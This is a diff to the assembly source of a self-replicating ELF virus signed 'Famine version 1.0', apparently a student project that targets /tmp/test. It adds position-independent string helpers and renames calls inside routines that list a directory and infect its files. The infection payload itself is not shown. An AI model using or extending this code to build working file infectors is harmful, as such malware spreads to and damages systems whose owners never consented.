@@ -104,7 +104,7 @@ _start:
     ; Build path on stack: "/tmp/test"
     lea rdi, [rsp + 8]          ; path buffer
     lea rsi, [r15 + v_firstDir - virus_start]  ; virus embedded string
-    call str_copy
+    call virus_str_copy
     
     ; List files in directory
     lea rdi, [rsp + 8]          ; path buffer
@@ -148,6 +148,38 @@ v_firstDir:       db "/tmp/test", 0
 v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
 v_signature_len:  equ $ - v_signature - 1
 
+; ============================================
+; virus_str_copy - Copy string (position independent)
+; rdi = destination
+; rsi = source
+; ============================================
+virus_str_copy:
+    push rax
+.v_str_copy_loop:
+    lodsb
+    stosb
+    test al, al
+    jnz .v_str_copy_loop
+    pop rax
+    ret
+
+; ============================================
+; virus_str_len - Get string length
+; rdi = string pointer
+; Returns: rax = length
+; ============================================
+virus_str_len:
+    push rdi
+    xor rax, rax
+.v_str_len_loop:
+    cmp byte [rdi], 0
+    je .v_str_len_done
+    inc rdi
+    inc rax
+    jmp .v_str_len_loop
+.v_str_len_done:
+    pop rdi
+    ret
 
 ; ============================================
 ; virus_search_signature - Search for signature in buffer
@@ -247,7 +279,7 @@ virus_list_and_infect:
 
     ; Get path length
     mov rdi, r12
-    call str_len
+    call virus_str_len
     mov [rbp-8], rax            ; save path length
 
     ; Open directory
@@ -323,7 +355,7 @@ virus_list_and_infect:
 .vl_no_slash:
     ; rsi already points to d_name
     push rdi
-    call str_copy
+    call virus_str_copy
     pop rdi
 
     ; Try to infect this file
